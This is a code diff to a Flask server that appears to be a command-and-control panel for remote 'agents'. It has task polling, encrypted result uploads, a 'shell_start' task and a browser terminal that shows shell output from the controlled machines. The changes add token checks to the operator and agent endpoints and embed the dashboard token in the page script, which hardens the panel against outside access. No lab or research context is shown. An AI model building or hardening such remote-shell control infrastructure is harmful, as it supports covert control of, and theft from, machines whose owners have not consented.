@@ -110,6 +110,9 @@ def agent_login():
 
 @app.route('/api/agents', methods=['GET'])
 def list_agents():
+    tok = request.args.get("token", "")
+    if tok != DASH_TOKEN:
+        return jsonify({"error": "unauthorized"}), 403
     now = datetime.now(timezone.utc)
     with LOCK:
         out = []
@@ -127,13 +130,18 @@ def list_agents():
 @app.route('/api/tasks/<aid>', methods=['GET', 'POST'])
 def handle_tasks(aid):
     if request.method == 'GET':
+        tok = request.args.get("token", "")
         with LOCK:
-            if aid in AGENTS:
-                AGENTS[aid]["last_seen"] = datetime.now(timezone.utc).isoformat()
+            agent = AGENTS.get(aid)
+            if not agent:
+                return jsonify({"error": "unknown agent"}), 404
+            if agent.get("token") != tok:
+                return jsonify({"error": "unauthorized"}), 403
+            AGENTS[aid]["last_seen"] = datetime.now(timezone.utc).isoformat()
             tasks = TASKS.get(aid, [])
             out = tasks[:]
             TASKS[aid] = []
-        return jsonify({"tasks": out, "interval": 5, "known": aid in AGENTS})
+        return jsonify({"tasks": out, "interval": 5, "known": True})
     else:
         data = request.get_json(force=True)
         raw = decrypt(data.get("cipher", ""))
@@ -175,6 +183,9 @@ def get_honeypot():
 
 @app.route('/api/results/<aid>', methods=['GET'])
 def get_results(aid):
+    tok = request.args.get("token", "")
+    if tok != DASH_TOKEN:
+        return jsonify({"error": "unauthorized"}), 403
     with LOCK:
         r = RESULTS.get(aid, [])
     return jsonify({"results": r})
@@ -235,10 +246,10 @@ tr:hover{background:#161b22}
 <div id="no">select agent</div>
 <div id="term" class="hidden"><div id="term-out"></div><div id="term-in"><span id="prompt"></span><input id="input" placeholder="command" autofocus spellcheck="false" autocomplete="off"></div></div>
 <script>
-let A={},S=null,RC=0,SO=null;
+let DT="__DASH_TOKEN__",A={},S=null,RC=0,SO=null;
 async function ap(u,o){let r=await fetch(u,o);return r.json()}
 async function la(){
-  let d=await ap('/api/agents');A={};
+  let d=await ap('/api/agents?token='+DT);A={};
   let tb=document.getElementById('ab');tb.innerHTML='';
   for(let a of d.agents||[]){
     A[a.id]=a;let tr=document.createElement('tr');
@@ -262,7 +273,7 @@ async function sel(id){
   ap('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:S,type:'shell_start',payload:''})});
   if(SO)clearInterval(SO);
   SO=setInterval(async()=>{
-    let d=await ap('/api/results/'+S);
+    let d=await ap('/api/results/'+S+'?token='+DT);
     let r=d.results||[];
     for(let i=RC;i<r.length;i++){
       if(r[i].type=='shell_output'){
@@ -363,7 +374,8 @@ def dashboard():
             "</body></html>",
             mimetype='text/html'
         )
-    resp = Response(DASHBOARD, mimetype='text/html')
+    html = DASHBOARD.replace("__DASH_TOKEN__", DASH_TOKEN)
+    resp = Response(html, mimetype='text/html')
     resp.set_cookie("token", DASH_TOKEN, max_age=86400)
     return resp
 
